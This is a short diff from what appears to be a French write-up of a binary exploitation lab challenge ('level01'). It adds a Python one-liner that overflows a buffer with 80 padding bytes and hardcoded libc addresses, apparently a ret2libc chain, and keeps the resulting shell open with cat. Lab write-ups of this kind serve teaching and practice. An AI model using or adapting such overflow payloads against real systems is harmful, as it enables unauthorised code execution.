@@ -80,3 +80,5 @@ Notre stack ressemblera donc a ceci:
 Notez l'adresse retour qui correspond a la sauvegarde de $eip pour l'instruction suivante, on y insere ici l'adresse d'exit pour quitter proprement apres l'exploit, mais ceci est optionel.
 
 ![image](https://user-images.githubusercontent.com/29956389/94990423-42384680-057c-11eb-963b-7633d8d1968a.png)
+
+`(python -c 'print "dat_wilzer" + "\x0a" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" + "\x0a"' ; cat ) | ./level01`
